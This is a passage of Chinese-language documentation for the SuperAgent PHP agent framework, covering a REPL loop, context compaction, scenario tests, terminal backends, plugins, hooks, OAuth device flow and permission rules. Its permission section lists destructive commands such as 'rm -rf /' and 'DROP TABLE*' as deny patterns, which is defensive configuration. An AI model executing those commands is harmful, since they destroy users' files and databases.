use SuperAgent\Harness\ToolStartedEvent;

$emitter = new StreamEventEmitter();

// 订阅特定事件
$emitter->on(TextDeltaEvent::class, fn($e) => echo $e->text);
$emitter->on(ToolStartedEvent::class, fn($e) => echo "工具: {$e->toolName}\n");

// 桥接到 QueryEngine 的 streaming handler
$handler = $emitter->toStreamingHandler();
$engine->prompt($message, streamingHandler: $handler);
```

---

## 35. Harness REPL 交互循环

> 带 10 个内建命令的交互式 Agent 循环，支持忙碌锁和会话自动保存。

### 概述

`HarnessLoop` 提供与 Agent 对话的交互式 REPL。集成 `CommandRouter` 的 10 个内建命令，支持 `continue_pending()` 恢复中断的工具循环，退出时自动保存会话。

### 内建命令

| 命令 | 描述 |
|---|---|
| `/help` | 显示可用命令 |
| `/status` | 显示 Agent 状态（模型、轮次、成本） |
| `/tasks` | 列出持久化任务 |
| `/compact` | 触发上下文压缩 |
| `/continue` | 恢复中断的工具循环 |
| `/session save\|load\|list\|delete` | 会话管理 |
| `/clear` | 清空对话历史 |
| `/model <name>` | 切换模型 |
| `/cost` | 显示成本明细 |
| `/quit` | 退出循环 |

### 使用

```php
use SuperAgent\Harness\HarnessLoop;
use SuperAgent\Harness\CommandRouter;

$loop = new HarnessLoop($agent, $engine);

// 注册自定义命令
$loop->getRouter()->register('/deploy', '部署到 staging', function ($args) {
    return new CommandResult('部署中...');
});

// 运行交互循环
$loop->run();
```

### 故障排除

**并发提交提示。** 忙碌锁防止重叠提交。等待当前轮次完成后再发送下一个提示。

**工具循环被中断。** 使用 `/continue` 恢复。引擎检测到待处理的 `ToolResultMessage` 后会恢复 `runLoop()` 而不添加新的用户消息。

---

## 36. 自动压缩器

> 两级压缩组件，用于 Agent 循环，带熔断器。

### 概述

`AutoCompactor` 在每轮循环开始时提供自动上下文压缩：
- **第 1 级（micro）：** 截断旧的 `ToolResultMessage` 内容——无需 LLM 调用
- **第 2 级（full）：** 委托 `ContextManager` 进行 LLM 摘要

可配置 `maxFailures` 的失败计数器作为熔断器。通过 `StreamEventEmitter` 发出 `CompactionEvent`。

### 使用

```php
use SuperAgent\Harness\AutoCompactor;

$compactor = AutoCompactor::fromConfig(overrides: ['enabled' => true]);

// 在每轮循环开始时调用
$compacted = $compactor->maybeCompact($messages, $tokenCount);
```

### 配置

自动压缩器遵循现有的 `context_management` 配置节。`fromConfig()` 方法也接受 `$overrides`，优先级：overrides > 配置 > 默认值。

---

## 37. E2E 场景测试框架

> 结构化场景定义、fluent builder、临时工作区和三维验证。

### 概述

场景框架支持 Agent 行为的端到端测试。`Scenario` 是带 fluent builder 的不可变值对象。`ScenarioRunner` 管理临时工作区，透明跟踪工具调用，在 3 个维度验证结果：必需工具、预期文本和自定义闭包。

### 使用

```php
use SuperAgent\Harness\Scenario;
use SuperAgent\Harness\ScenarioRunner;

$scenario = Scenario::create('文件创建测试')
    ->withPrompt('创建一个名为 hello.txt 的文件，内容为 "Hello World"')
    ->withRequiredTools(['write_file'])
    ->withExpectedText('hello.txt')
    ->withValidation(function ($result, $workspace) {
        return file_exists("$workspace/hello.txt");
    })
    ->withTags(['smoke', 'file-ops']);

$runner = new ScenarioRunner($agentFactory);
$result = $runner->run($scenario);

// 运行多个场景并按标签过滤
$results = $runner->runAll($scenarios, tags: ['smoke']);
echo $runner->summary($results); // 通过/失败/错误计数
```

---

## 38. Worktree 管理器

> 独立的 git worktree 生命周期管理，支持符号链接、元数据持久化和清理。

### 概述

`WorktreeManager` 提供从 `ProcessBackend` 提取的 git worktree 生命周期管理，便于复用。创建 worktree 时自动为大目录（node_modules、vendor、.venv）建立符号链接，以 `{slug}.meta.json` 持久化元数据，支持恢复和清理操作。

### 使用

```php
use SuperAgent\Swarm\WorktreeManager;

$manager = WorktreeManager::fromConfig(overrides: ['enabled' => true]);

// 创建 worktree
$info = $manager->create('feature-auth', baseBranch: 'main');
echo $info->path; // /path/to/.worktrees/feature-auth
echo $info->branch; // superagent/feature-auth

// 恢复已有 worktree
$info = $manager->resume('feature-auth');

// 清理过时的 worktree
$manager->prune();
```

### 故障排除

**Worktree 创建失败。** 确保仓库是 git 仓库且基础分支存在。检查 slug 仅包含 `[a-zA-Z0-9._-]` 字符。

**符号链接未创建。** 大目录（node_modules、vendor、.venv）必须在主 worktree 中存在才能被链接。

---

## 39. Tmux 后端

> 可视化多 Agent 调试，每个 Agent 运行在 tmux 面板中。

### 概述

`TmuxBackend` 实现 `BackendInterface`，在可见的 tmux 面板中生成 Agent。每个 Agent 通过 `tmux split-window -h` 获得自己的面板，自动执行 `select-layout tiled`。优雅降级：在 tmux 会话外 `isAvailable()` 返回 false。

### 使用

```php
use SuperAgent\Swarm\Backends\TmuxBackend;

$backend = new TmuxBackend();

if ($backend->isAvailable()) {
    $result = $backend->spawn($agentConfig);
    // Agent 现在运行在可见的 tmux 面板中

    // 优雅关闭
    $backend->requestShutdown($agentId); // 发送 Ctrl+C

    // 强制终止
    $backend->kill($agentId); // 移除面板
}
```

### 配置

在 swarm 配置中添加 `BackendType::TMUX`：

```php
'swarm' => [
    'backend' => env('SUPERAGENT_SWARM_BACKEND', 'process'),
    // 设置为 'tmux' 进行可视化调试
],
```

### 故障排除

**后端不可用。** TmuxBackend 需要在 tmux 会话中运行（`$TMUX` 环境变量）且安装了 `tmux`。使用 `detect()` 在生成前检查。

**面板排列不正确。** 生成多个 Agent 后会自动调用 `select-layout tiled`。如果布局有误，手动运行 `tmux select-layout tiled`。

---

## 40. API 重试中间件

> v0.7.8 新增

包装任何 `LLMProvider`，提供自动重试逻辑，包括指数退避、抖动和智能错误分类。

### 用法

```php
use SuperAgent\Providers\RetryMiddleware;

// 包装任何 provider
$resilientProvider = RetryMiddleware::wrap($provider, [
    'max_retries' => 3,
    'base_delay_ms' => 1000,
    'max_delay_ms' => 30000,
]);

// 错误分类
// - auth (401/403)：不重试
// - rate_limit (429)：重试，遵循 Retry-After 头
// - transient (500/502/503/529)：退避重试
// - unrecoverable：不重试

// 获取重试日志用于可观察性
$log = $resilientProvider->getRetryLog();
foreach ($log as $entry) {
    echo "{$entry['attempt']}: {$entry['error_type']} - 等待 {$entry['delay_ms']}ms\n";
}
```

### 退避公式

```
delay = min(base_delay * 2^attempt, max_delay) + random(0, 25% of delay)
```

抖动组件防止多个 Agent 同时重试时的惊群效应。

---

## 41. iTerm2 后端

> v0.7.8 新增

可视化 Agent 调试后端，通过 AppleScript 将每个 Agent 生成在独立的 iTerm2 分割面板中。

### 用法

```php
use SuperAgent\Swarm\Backends\ITermBackend;

$backend = new ITermBackend();

if ($backend->isAvailable()) {
    $result = $backend->spawn($agentConfig);
    // Agent 现在运行在可见的 iTerm2 面板中

    // 优雅关闭
    $backend->requestShutdown($agentId); // 发送 Ctrl+C

    // 强制终止
    $backend->kill($agentId); // 关闭会话
}
```

### 自动检测

ITermBackend 检查 `$ITERM_SESSION_ID` 环境变量和 `osascript` 可用性。在非 iTerm2 环境中 `isAvailable()` 返回 `false`。

### 配置

```php
'swarm' => [
    'backend' => env('SUPERAGENT_SWARM_BACKEND', 'process'),
    // 设置为 'iterm2' 在 iTerm2 中进行可视化调试
],
```

---

## 42. 插件系统

> v0.7.8 新增

可扩展的插件架构，用于将技能、Hook 和 MCP 服务器配置作为可复用包分发。

### 插件结构

```
my-plugin/
├── plugin.json          # 清单文件
├── skills/              # 技能 Markdown 文件
│   └── my-skill.md
├── hooks.json           # Hook 配置
└── mcp.json             # MCP 服务器配置
```

### 插件清单 (`plugin.json`)

```json
{
    "name": "my-plugin",
    "version": "1.0.0",
    "skills_dir": "skills",
    "hooks_file": "hooks.json",
    "mcp_file": "mcp.json"
}
```

### 用法

```php
use SuperAgent\Plugins\PluginLoader;

$loader = PluginLoader::fromDefaults();

// 从 ~/.superagent/plugins/ 和 .superagent/plugins/ 发现
$plugins = $loader->discover();

// 启用/禁用
$loader->enable('my-plugin');
$loader->disable('my-plugin');

// 安装/卸载
$loader->install('/path/to/my-plugin');
$loader->uninstall('my-plugin');

// 收集所有启用插件的技能、Hook、MCP 配置
$allSkills = $loader->collectSkills();
$allHooks = $loader->collectHooks();
$allMcp = $loader->collectMcpConfigs();
```

### 配置

```php
'plugins' => [
    'enabled' => env('SUPERAGENT_PLUGINS_ENABLED', false),
    'enabled_plugins' => [], // 要启用的插件名称列表
],
```

---

## 43. 可观察应用状态

> v0.7.8 新增

响应式应用状态管理，使用不可变状态对象和观察者模式。

### 用法

```php
use SuperAgent\State\AppState;
use SuperAgent\State\AppStateStore;

// 创建初始状态
$state = new AppState(
    model: 'claude-opus-4-6',
    permissionMode: 'default',
    provider: 'anthropic',
    cwd: getcwd(),
    turnCount: 0,
    totalCostUsd: 0.0,
);

// 不可变更新
$newState = $state->with(turnCount: 1, totalCostUsd: 0.05);

// 可观察存储
$store = new AppStateStore($state);

// 订阅变更
$unsubscribe = $store->subscribe(function (AppState $newState, AppState $oldState) {
    echo "轮次：{$oldState->turnCount} → {$newState->turnCount}\n";
});

$store->set($store->get()->with(turnCount: 1));
// 输出：轮次：0 → 1

// 完成后取消订阅
$unsubscribe();
```

---

## 44. Hook 热重载

> v0.7.8 新增

配置文件变更时自动重新加载 Hook 配置，无需重启应用。

### 用法

```php
use SuperAgent\Hooks\HookReloader;

// 从默认配置位置创建
$reloader = HookReloader::fromDefaults();

// 检查并在变更时重载（定期调用或每轮调用前调用）
if ($reloader->hasChanged()) {
    $reloader->forceReload();
}

// 支持 JSON 和 PHP 配置格式
// ~/.superagent/hooks.json 或 config/superagent-hooks.php
```

### 工作原理

重载器监控配置文件的 `mtime`。检测到变更时，重新解析配置并使用更新后的 Hook 重建 `HookRegistry`。

---

## 45. Prompt & Agent Hook

> v0.7.8 新增

基于 LLM 的 Hook 类型，通过向 AI 模型发送提示来验证操作。

### Prompt Hook

```php
use SuperAgent\Hooks\PromptHook;

$hook = new PromptHook(
    prompt: '这个文件修改安全吗？文件：$ARGUMENTS',
    blockOnFailure: true,
    matcher: ['event' => 'tool:edit_file'],
);

// Hook 发送提示（$ARGUMENTS 替换为实际参数）
// 到配置的 LLM provider 并期望：
// {"ok": true} 或 {"ok": false, "reason": "解释"}
```

### Agent Hook

```php
use SuperAgent\Hooks\AgentHook;

$hook = new AgentHook(
    prompt: '审查此操作的安全影响：$ARGUMENTS',
    blockOnFailure: true,
    matcher: ['event' => 'tool:bash'],
    timeout: 60, // 更深入分析的扩展超时
);
```

Agent Hook 提供扩展上下文（对话历史、工具调用上下文），用于更明智的验证。

---

## 46. 多通道网关

> v0.7.8 新增

消息抽象层，将 Agent 通信与特定平台解耦。

### 架构

```
外部平台 → Channel → MessageBus（入站队列）→ Agent 核心
Agent 核心 → MessageBus（出站队列）→ ChannelManager → Channels → 外部平台
```

### 用法

```php
use SuperAgent\Channels\ChannelManager;
use SuperAgent\Channels\WebhookChannel;
use SuperAgent\Channels\MessageBus;

$bus = new MessageBus();
$manager = new ChannelManager($bus);

// 注册 webhook 通道
$webhook = new WebhookChannel('my-webhook', [
    'url' => 'https://example.com/webhook',
    'allowed_senders' => ['user-1', 'user-2'], // ACL
]);
$manager->register($webhook);

// 启动所有通道
$manager->startAll();

// 发送出站消息
$manager->dispatch(new OutboundMessage(
    channel: 'my-webhook',
    sessionKey: 'session-123',
    content: '任务完成',
));

// 读取入站消息
while ($message = $bus->dequeueInbound()) {
    // 处理 $message->content
}
```

### 配置

```php
'channels' => [
    'my-webhook' => [
        'type' => 'webhook',
        'url' => 'https://example.com/webhook',
        'allowed_senders' => ['*'], // 允许所有
    ],
],
```

---

## 47. 后端协议

> v0.7.8 新增

基于 JSON-lines 的协议，用于前端 UI 和 SuperAgent 后端之间的结构化通信。

### 协议格式

消息以 `SAJSON:` 为前缀，后跟 JSON 对象：

```
SAJSON:{"type":"ready","data":{"version":"0.7.8"}}
SAJSON:{"type":"assistant_delta","data":{"text":"你好"}}
SAJSON:{"type":"tool_started","data":{"tool":"read_file","input":{"path":"/src/Agent.php"}}}
```

### 事件类型

| 事件 | 描述 |
|------|------|
| `ready` | 后端初始化完成 |
| `assistant_delta` | 流式文本块 |
| `assistant_complete` | 完整响应完成 |
| `tool_started` | 工具开始执行 |
| `tool_completed` | 工具执行完成 |
| `status` | 状态更新 |
| `error` | 发生错误 |
| `modal_request` | 需要 UI 弹窗（权限等） |

### 用法

```php
use SuperAgent\Harness\BackendProtocol;
use SuperAgent\Harness\FrontendRequest;

$protocol = new BackendProtocol(STDOUT);

// 发射事件
$protocol->emitReady(['version' => '0.7.8']);
$protocol->emitAssistantDelta('你好，');
$protocol->emitToolStarted('read_file', ['path' => '/src/Agent.php']);

// 读取前端请求
$request = FrontendRequest::readRequest(STDIN);
// $request->type: 'submit', 'permission', 'question', 'select'

// 桥接 StreamEvent 到协议
$bridge = $protocol->createStreamBridge();
// 自动将所有 StreamEvent 类型映射到协议事件
```

---

## 48. OAuth 设备码流程

> v0.7.8 新增

符合 RFC 8628 的设备授权流程，用于基于 CLI 的身份验证。

### 用法

```php
use SuperAgent\Auth\DeviceCodeFlow;
use SuperAgent\Auth\CredentialStore;

$flow = new DeviceCodeFlow(
    clientId: 'your-client-id',
    tokenEndpoint: 'https://auth.example.com/token',
    deviceEndpoint: 'https://auth.example.com/device',
);

// 步骤 1：请求设备码
$deviceCode = $flow->requestDeviceCode(['openid', 'profile']);
echo "访问 {$deviceCode->verificationUri} 并输入：{$deviceCode->userCode}\n";

// 步骤 2：轮询 token（自动在 macOS/Linux/Windows 打开浏览器）
$token = $flow->pollForToken($deviceCode);

// 步骤 3：安全存储凭证
$store = new CredentialStore('~/.superagent/credentials');
$store->save('provider-name', $token);

// 之后：获取
$token = $store->load('provider-name');
if ($token->isExpired()) {
    $token = $flow->refreshToken($token->refreshToken);
}
```

### 配置

```php
'auth' => [
    'credential_store_path' => env('SUPERAGENT_CREDENTIAL_STORE', null),
    'device_code' => [
        'provider-name' => [
            'client_id' => env('PROVIDER_CLIENT_ID'),
            'token_endpoint' => 'https://...',
            'device_endpoint' => 'https://...',
        ],
    ],
],
```

---

## 49. 权限路径规则

> v0.7.8 新增

基于 glob 的文件路径和命令权限规则，用于细粒度访问控制。

### 用法

```php
use SuperAgent\Permissions\PathRule;
use SuperAgent\Permissions\CommandDenyPattern;
use SuperAgent\Permissions\PathRuleEvaluator;

// 定义路径规则
$rules = [
    PathRule::allow('src/**/*.php'),         // 允许 src/ 下所有 PHP 文件
    PathRule::deny('src/Auth/**'),           // 但拒绝 Auth 目录
    PathRule::allow('tests/**'),             // 允许所有测试文件
    PathRule::deny('.env*'),                 // 拒绝 env 文件
];

// 定义命令拒绝模式
$denyCommands = [
    new CommandDenyPattern('rm -rf *'),
    new CommandDenyPattern('DROP TABLE*'),
];

// 评估
$evaluator = PathRuleEvaluator::fromConfig([
    'path_rules' => $rules,
    'denied_commands' => $denyCommands,
]);

$decision = $evaluator->evaluate('/src/Agent.php');
// PermissionDecision::ALLOW

$decision = $evaluator->evaluate('/src/Auth/Secret.php');
// PermissionDecision::DENY（拒绝规则优先）

$decision = $evaluator->evaluateCommand('rm -rf /');
// PermissionDecision::DENY
```

### 配置

```php
'permission_rules' => [
    'path_rules' => [
        ['pattern' => 'src/**/*.php', 'action' => 'allow'],
        ['pattern' => '.env*', 'action' => 'deny'],
    ],
    'denied_commands' => [
        'rm -rf *',
        'DROP TABLE*',
    ],
],
```

---

## 50. 协调器任务通知

> v0.7.8 新增

结构化 XML 通知，用于向协调器报告子 Agent 任务完成情况。

### 用法

```php
use SuperAgent\Coordinator\TaskNotification;

// 从 Agent 结果创建
$notification = TaskNotification::fromResult(
    taskId: 'task-abc-123',
    status: 'completed',
    summary: '实现了新功能',
    result: '创建了3个文件，修改了2个文件',
    usage: ['input_tokens' => 5000, 'output_tokens' => 2000],
    cost: 0.15,
    toolsUsed: ['read_file', 'edit_file', 'bash'],
    turnCount: 8,
);

// 注入协调器对话作为 XML
$xml = $notification->toXml();

// 紧凑文本格式用于日志
$text = $notification->toText();

// 从 XML 解析（往返安全）
$parsed = TaskNotification::fromXml($xml);
```
